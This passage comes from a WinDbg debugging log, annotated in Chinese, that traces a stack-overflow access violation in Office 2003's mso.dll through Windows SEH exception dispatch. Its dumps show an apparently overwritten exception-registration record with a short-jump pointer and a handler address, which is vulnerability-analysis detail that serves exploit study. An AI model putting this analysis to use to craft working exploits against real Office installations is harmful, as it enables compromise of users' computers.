Office\OFFICE11\GdiPlus.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll</span><br><span class="line">(<span class="number">140.e28</span>): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=<span class="number">00000022</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=30ed442c <span class="built_in">esp</span>=001237b4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll - </span><br><span class="line">mso!Ordinal1246+<span class="number">0x16b0</span>:</span><br><span class="line">30ed442c f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>] &lt;----发生异常</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; gn</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=<span class="number">00000022</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92e45c <span class="built_in">esp</span>=001234c4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">ntdll!KiUserExceptionDispatcher:</span><br><span class="line">7c92e45c 8b4c2404        <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">4</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:001234c8=001234e8</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001234c4  001234cc 001234e8 c0000005 <span class="number">00000000</span></span><br><span class="line">001234d4  <span class="number">00000000</span> 30ed442c <span class="number">00000002</span> <span class="number">00000001</span></span><br><span class="line">001234e4  <span class="number">00130000</span> 0001003f <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">001234f4  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123504</span>  ffff037f ffff0000 ffffffff 30d582a7</span><br><span class="line"><span class="number">00123514</span>  <span class="number">00000000</span> <span class="number">00000000</span> ffff0000 ff354963</span><br><span class="line"><span class="number">00123524</span>  <span class="number">00000000</span> 4963ffff 0000ff35 ffff0000</span><br><span class="line"><span class="number">00123534</span>  <span class="number">00000000</span> <span class="number">00000000</span> 0000ffff <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_RECORD 001234cc</span><br><span class="line">ntdll!_EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> ExceptionCode    : 0n-<span class="number">1073741819</span> &lt;---- <span class="number">16</span>进制补码(C0000005),EXCEPTION_INVALID_VIOLATION,读写内存违规</span><br><span class="line">   +<span class="number">0x004</span> ExceptionFlags   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> ExceptionRecord  : (null) </span><br><span class="line">   +<span class="number">0x00c</span> ExceptionAddress : <span class="number">0x30ed442c</span> Void &lt;---- 发生异常的指令地址</span><br><span class="line">   +<span class="number">0x010</span> NumberParameters : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x014</span> ExceptionInformation : [<span class="number">15</span>] <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _CONTEXT 001234e8 </span><br><span class="line">ntdll!_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> ContextFlags     : <span class="number">0x1003f</span></span><br><span class="line">   +<span class="number">0x004</span> <span class="built_in">Dr0</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> <span class="built_in">Dr1</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> <span class="built_in">Dr2</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x010</span> <span class="built_in">Dr3</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x014</span> Dr6              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x018</span> Dr7              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA</span><br><span class="line">   +<span class="number">0x08c</span> SegGs            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x090</span> SegFs            : <span class="number">0x3b</span></span><br><span class="line">   +<span class="number">0x094</span> SegEs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x098</span> SegDs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x09c</span> <span class="built_in">Edi</span>              : <span class="number">0x130000</span></span><br><span class="line">   +<span class="number">0x0a0</span> <span class="built_in">Esi</span>              : <span class="number">0x1104c830</span></span><br><span class="line">   +<span class="number">0x0a4</span> <span class="built_in">Ebx</span>              : <span class="number">0x5000000</span></span><br><span class="line">   +<span class="number">0x0a8</span> <span class="built_in">Edx</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0ac</span> <span class="built_in">Ecx</span>              : <span class="number">0x22</span></span><br><span class="line">   +<span class="number">0x0b0</span> <span class="built_in">Eax</span>              : <span class="number">0xc8ac</span></span><br><span class="line">   +<span class="number">0x0b4</span> <span class="built_in">Ebp</span>              : <span class="number">0x1237ec</span></span><br><span class="line">   +<span class="number">0x0b8</span> <span class="built_in">Eip</span>              : <span class="number">0x30ed442c</span></span><br><span class="line">   +<span class="number">0x0bc</span> SegCs            : <span class="number">0x1b</span></span><br><span class="line">   +<span class="number">0x0c0</span> EFlags           : <span class="number">0x10206</span></span><br><span class="line">   +<span class="number">0x0c4</span> <span class="built_in">Esp</span>              : <span class="number">0x1237b4</span></span><br><span class="line">   +<span class="number">0x0c8</span> SegSs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x0cc</span> ExtendedRegisters : [<span class="number">512</span>]  <span class="string">"???"</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">1</span> hit</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=001234cc <span class="built_in">ecx</span>=001234e8 <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92e465 <span class="built_in">esp</span>=001234bc <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">ntdll!KiUserExceptionDispatcher+<span class="number">0x9</span>:</span><br><span class="line">7c92e465 e8e6c40100      <span class="keyword">call</span>    ntdll!RtlDispatchException (7c94a950)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001234bc  001234cc 001234e8 001234cc 001234e8</span><br><span class="line">001234cc  c0000005 <span class="number">00000000</span> <span class="number">00000000</span> 30ed442c</span><br><span class="line">001234dc  <span class="number">00000002</span> <span class="number">00000001</span> <span class="number">00130000</span> 0001003f</span><br><span class="line">001234ec  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">001234fc  <span class="number">00000000</span> <span class="number">00000000</span> ffff037f ffff0000</span><br><span class="line">0012350c  ffffffff 30d582a7 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012351c  ffff0000 ff354963 <span class="number">00000000</span> 4963ffff</span><br><span class="line">0012352c  0000ff35 ffff0000 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=001234cc <span class="built_in">ecx</span>=001234e8 <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c94a950 <span class="built_in">esp</span>=001234b8 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">ntdll!RtlDispatchException:</span><br><span class="line">7c94a950 8bff            <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">2</span> hit</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c92e4f4 <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c94a9ea <span class="built_in">esp</span>=<span class="number">00123430</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!RtlDispatchException+<span class="number">0xac</span>:</span><br><span class="line">7c94a9ea e85888fdff      <span class="keyword">call</span>    ntdll!RtlpExecuteHandlerForException (7c923247)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line"><span class="number">00123430</span>  001234cc 0012ffb0 001234e8 001234a0</span><br><span class="line"><span class="number">00123440</span>  30001bdd <span class="number">00130000</span> 001234cc 1104c830</span><br><span class="line"><span class="number">00123450</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123460</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123470</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123480</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123490</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">001234a0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00130000</span> <span class="number">00119000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_RECORD 001234cc</span><br><span class="line">ntdll!_EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> ExceptionCode    : 0n-<span class="number">1073741819</span> &lt;---- <span class="number">16</span>进制补码(C0000005),EXCEPTION_INVALID_VIOLATION,读写内存违规</span><br><span class="line">   +<span class="number">0x004</span> ExceptionFlags   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> ExceptionRecord  : (null) </span><br><span class="line">   +<span class="number">0x00c</span> ExceptionAddress : <span class="number">0x30ed442c</span> Void &lt;---- 发生异常的指令地址</span><br><span class="line">   +<span class="number">0x010</span> NumberParameters : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x014</span> ExceptionInformation : [<span class="number">15</span>] <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_REGISTRATION_RECORD 0012ffb0 </span><br><span class="line">ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0xa29706eb</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x30001bdd</span>     _EXCEPTION_DISPOSITION  +<span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _CONTEXT 001234e8 </span><br><span class="line">ntdll!_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> ContextFlags     : <span class="number">0x1003f</span></span><br><span class="line">   +<span class="number">0x004</span> <span class="built_in">Dr0</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> <span class="built_in">Dr1</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> <span class="built_in">Dr2</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x010</span> <span class="built_in">Dr3</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x014</span> Dr6              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x018</span> Dr7              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA</span><br><span class="line">   +<span class="number">0x08c</span> SegGs            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x090</span> SegFs            : <span class="number">0x3b</span></span><br><span class="line">   +<span class="number">0x094</span> SegEs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x098</span> SegDs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x09c</span> <span class="built_in">Edi</span>              : <span class="number">0x130000</span></span><br><span class="line">   +<span class="number">0x0a0</span> <span class="built_in">Esi</span>              : <span class="number">0x1104c830</span></span><br><span class="line">   +<span class="number">0x0a4</span> <span class="built_in">Ebx</span>              : <span class="number">0x5000000</span></span><br><span class="line">   +<span class="number">0x0a8</span> <span class="built_in">Edx</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0ac</span> <span class="built_in">Ecx</span>              : <span class="number">0x22</span></span><br><span class="line">   +<span class="number">0x0b0</span> <span class="built_in">Eax</span>              : <span class="number">0xc8ac</span></span><br><span class="line">   +<span class="number">0x0b4</span> <span class="built_in">Ebp</span>              : <span class="number">0x1237ec</span></span><br><span class="line">   +<span class="number">0x0b8</span> <span class="built_in">Eip</span>              : <span class="number">0x30ed442c</span></span><br><span class="line">   +<span class="number">0x0bc</span> SegCs            : <span class="number">0x1b</span></span><br><span class="line">   +<span class="number">0x0c0</span> EFlags           : <span class="number">0x10206</span></span><br><span class="line">   +<span class="number">0x0c4</span> <span class="built_in">Esp</span>              : <span class="number">0x1237b4</span></span><br><span class="line">   +<span class="number">0x0c8</span> SegSs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x0cc</span> ExtendedRegisters : [<span class="number">512</span>]  <span class="string">"???"</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> 001234a0</span><br><span class="line">001234a0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00130000</span> <span class="number">00119000</span></span><br><span class="line">001234b0  <span class="number">00000000</span> 001237ec 7c92e46a <span class="number">00000000</span></span><br><span class="line">001234c0  001234e8 001234cc 001234e8 c0000005</span><br><span class="line">001234d0  <span class="number">00000000</span> <span class="number">00000000</span> 30ed442c <span class="number">00000002</span></span><br><span class="line">001234e0  <span class="number">00000001</span> <span class="number">00130000</span> 0001003f <span class="number">00000000</span></span><br><span class="line">001234f0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123500</span>  <span class="number">00000000</span> ffff037f ffff0000 ffffffff</span><br><span class="line"><span class="number">00123510</span>  30d582a7 <span class="number">00000000</span> <span class="number">00000000</span> ffff0000</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c92e4f4 <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923247 <span class="built_in">esp</span>=0012342c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!RtlpExecuteHandlerForException:</span><br><span class="line">7c923247 babc32927c      <span class="keyword">mov</span>     <span class="built_in">edx</span>,offset ntdll!ExecuteHandler2+<span class="number">0x3a</span> (7c9232bc) &lt;---- ExecuteHandler2中安装的SEH记录的回调函数地址</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92324c <span class="built_in">esp</span>=0012342c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!RtlpExecuteHandlerForException+<span class="number">0x5</span>:</span><br><span class="line">7c92324c eb08            <span class="keyword">jmp</span>     ntdll!ExecuteHandler (7c923256)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line">Breakpoint <span class="number">3</span> hit</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923256 <span class="built_in">esp</span>=0012342c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler:</span><br><span class="line">7c923256 <span class="number">53</span>              <span class="keyword">push</span>    <span class="built_in">ebx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">0012342c  7c94a9ef 001234cc 0012ffb0 001234e8</span><br><span class="line">0012343c  001234a0 30001bdd <span class="number">00130000</span> 001234cc</span><br><span class="line">0012344c  1104c830 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012345c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012346c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012347c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012348c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012349c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00130000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923257 <span class="built_in">esp</span>=<span class="number">00123428</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x1</span>:</span><br><span class="line">7c923257 <span class="number">56</span>              <span class="keyword">push</span>    <span class="built_in">esi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923258 <span class="built_in">esp</span>=<span class="number">00123424</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x2</span>:</span><br><span class="line">7c923258 <span class="number">57</span>              <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923259 <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x3</span>:</span><br><span class="line">7c923259 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line"><span class="number">00123420</span>  <span class="number">00130000</span> 001234cc 0012ffb0 7c94a9ef</span><br><span class="line"><span class="number">00123430</span>  001234cc 0012ffb0 001234e8 001234a0</span><br><span class="line"><span class="number">00123440</span>  30001bdd <span class="number">00130000</span> 001234cc 1104c830</span><br><span class="line"><span class="number">00123450</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123460</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123470</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123480</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123490</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92325b <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x5</span>:</span><br><span class="line">7c92325b 33<span class="built_in">db</span>            <span class="keyword">xor</span>     <span class="built_in">ebx</span>,<span class="built_in">ebx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92325d <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x7</span>:</span><br><span class="line">7c92325d 33f6            <span class="keyword">xor</span>     <span class="built_in">esi</span>,<span class="built_in">esi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92325f <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span 